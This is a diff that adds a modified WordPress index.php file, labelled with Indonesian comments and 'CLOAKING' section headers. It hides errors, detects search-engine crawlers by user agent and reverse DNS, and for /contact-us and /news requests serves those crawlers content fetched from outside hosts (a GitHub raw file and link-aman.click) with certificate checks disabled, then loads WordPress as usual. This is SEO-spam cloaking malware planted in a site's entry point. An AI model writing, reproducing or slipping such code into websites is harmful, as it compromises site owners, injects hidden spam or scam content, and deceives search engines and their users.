@@ -1,0 +1,97 @@
+<?php
+error_reporting(0);
+ini_set('display_errors', 0);
+
+/* =========================
+   GLOBAL FUNCTION (JANGAN DUPLIKAT)
+========================= */
+
+function isBot($userAgent) {
+    $bots = [
+        'Googlebot','Bingbot','Slurp','DuckDuckBot','Baiduspider',
+        'YandexBot','Sogou','TelegramBot','Exabot','facebot',
+        'ia_archiver','Google-Site-Verification','Google-InspectionTool'
+    ];
+    foreach ($bots as $bot) {
+        if (stripos($userAgent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function isGooglebotIP($ip) {
+    $hostname = gethostbyaddr($ip);
+    return (
+        strpos($hostname, 'googlebot.com') !== false ||
+        strpos($hostname, 'google.com') !== false ||
+        strpos($hostname, 'googleusercontent.com') !== false
+    );
+}
+
+function bypEg($url) {
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_FOLLOWLOCATION => true
+    ]);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return $response;
+}
+
+/* =========================
+   CLOAKING /contact-us
+========================= */
+
+if (strpos($_SERVER['REQUEST_URI'], '/contact-us') !== false) {
+
+    $ua  = $_SERVER["HTTP_USER_AGENT"] ?? '';
+    $ip  = $_SERVER['REMOTE_ADDR'] ?? '';
+    $uri = urlencode($_SERVER["REQUEST_URI"]);
+
+    if (isBot($ua) && isGooglebotIP($ip)) {
+
+        $url = "https://raw.githubusercontent.com/deniprisandiofficial1-maker/dp678/refs/heads/main/contact-paul.txt?uri={$uri}";
+
+        $result = bypEg($url);
+
+        if (!empty($result)) {
+            echo $result;
+            exit;
+        }
+    }
+}
+
+/* =========================
+   CLOAKING /news
+========================= */
+
+if (strpos($_SERVER['REQUEST_URI'], '/news') !== false) {
+
+    $ua  = $_SERVER["HTTP_USER_AGENT"] ?? '';
+    $ip  = $_SERVER['REMOTE_ADDR'] ?? '';
+    $uri = urlencode($_SERVER["REQUEST_URI"]);
+
+    if (isBot($ua) && isGooglebotIP($ip)) {
+
+        $url = "https://link-aman.click/cron/paul-news.txt?uri={$uri}";
+
+        $result = bypEg($url);
+
+        if (!empty($result)) {
+            echo $result;
+            exit;
+        }
+    }
+}
+
+/* =========================
+   WORDPRESS LOAD
+========================= */
+
+define('WP_USE_THEMES', true);
+require __DIR__ . '/wp-blog-header.php';
